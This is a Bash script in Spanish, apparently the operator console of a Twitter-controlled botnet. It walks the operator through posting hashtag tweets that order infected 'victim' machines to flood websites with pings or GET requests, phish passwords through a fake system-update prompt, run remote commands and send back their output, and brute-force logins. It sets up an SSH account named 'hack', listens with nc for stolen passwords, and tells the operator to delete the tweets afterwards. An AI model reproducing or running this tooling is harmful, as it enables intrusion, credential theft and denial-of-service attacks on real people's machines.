#!/bin/bash
echo Autentificate en la cuenta de twitter, y escribe yes cuando lo hagas.
read autentificado
while [ $autentificado != yes ]
	do
		echo Si lo has hecho introduce yes.
		read autentificado
done
echo Habilita "ssh" en tu maquina y crea un Usuario: hack , Pass: 12345 y escribe yes cuando lo hagas.
read habilitado
while [ $habilitado != yes ]
	do
		echo Si lo has hecho introduce yes.
		read habilitado
done
echo
echo
echo Introduce una de las siguientes opciones segun la función que quieras realizar en las maquinas:
echo
echo
echo I: Identificar cada una de las maquinas infectadas.//Recomendado realizar antes de cualquier otra funcionalidad. 
echo
echo PING: Hacer "ping" a una página web.
echo
echo G: Hacer peticiones a una página web.
echo
echo P: Intentar sacar las credenciales de la máquina afectada mediante un simulador de actualización del sistema.
echo 
echo S: Ejecutar comandos remotos en la máquina afectada y recibir la salida.
echo
echo PASS: Sacar las credenciales de una máquina mediante ataques de fuerza bruta con un diccionario de contraseñas.
echo
echo R: Para reiniciar el programa y poder volver a ejecutar funcionalidades.
echo 
echo EXIT: Para terminar el programa.
var=0

while true;
do
	read ejecucion 
	if [ $ejecucion = I ]; then
		echo Introduce la ip de tu máquina.
		read ip
		echo El tweet a introducir es: "#I" $ip 8888 $var
		sleep 10 
		gnome-terminal -e "php socket.php"
		echo En la home de tu ordenador encontraras un archivo llamado victimas.txt con los "id" de tus victimas. 
		sleep 30
		pidof php | xargs kill
	fi
	if [ $ejecucion = PING ]; then
		echo Introduce la ip a la que quieras hacer "ping".
		read ipPing
		echo Introduce el numero de pings que quieras realizar.
		read numPings 	
		echo El tweet a introducir es: "#PING" $ipPing $numPings $var
		sleep 10
		echo Recuerde que si introduce un nuevo tweet antes de que acaben los pings, éstos se detendrán.
		sleep 2
	fi
	if [ $ejecucion = G ]; then
		echo Introduce la página a la que quieras hacer gets.
		read web
		echo Introduce el numero de gets que quieras realizar.
		read numGets 	
		echo Introduce el delay entre peticiones en segundos.
		read delayGets
		echo El tweet a introducir es: "#G" $web $numGets $delayGets $var
		sleep 10
		echo Recuerde que si introduce un nuevo tweet antes de que acaben los gets, éstos se detendrán.
		sleep 2
	fi
	if [ $ejecucion = P ]; then
		echo El tweet a introducir es: "#P" $var
		sleep 10
		echo La contraseña de la máquina infectada es:
		nc -lvp 6270
		sleep 2
	fi
	if [ $ejecucion = R ]; then
		echo El tweet a introducir es: "#R" $var
		sleep 10
		echo El programa se ha reiniciado y puedes volver a ejecutar funciones ya ejecutadas
		sleep 2
	fi
	if [ $ejecucion = PASS ]; then
		echo Introduce una IP que atacar.
		read ip
		echo Introduce un usuario que atacar.
		read usuario
		echo Introduce un enlace a un diccionario de passwords.
		read diccionario
		echo Introduce los "id" de las maquinas afectadas separados por espacios.
		read ids
		echo El tweet a introducir es: "#PASS" $ip $usuario $diccionario $ids $var
		sleep 10
		echo En caso de éxito podrá encontrar en /home/hack un archivo passRight.txt con la contraseña.
		echo Recuerde que si introduce un nuevo tweet antes de que se consiga la contraseña, el proceso se detendrá.
		sleep 2
	fi
	if [ $ejecucion = S ]; then
		echo Introduce el comando que quieras ejecutar en las máquinas infectadas.
		read comando	
		echo El tweet a introducir es: "#S" $comando $var
		sleep 10
		echo En la carpeta /home/hack/ encontrará unos archivos con nombre los "id" de las victimas y la salida producida por el comando.
		sleep 2 
	fi
	if [ $ejecucion = EXIT ]; then
		echo Cerrando programa...
		echo No olvides borrar los tweets.
		sleep 1
		break
	fi
	echo Introduce una nueva funcion.
	var=$((var+1))
done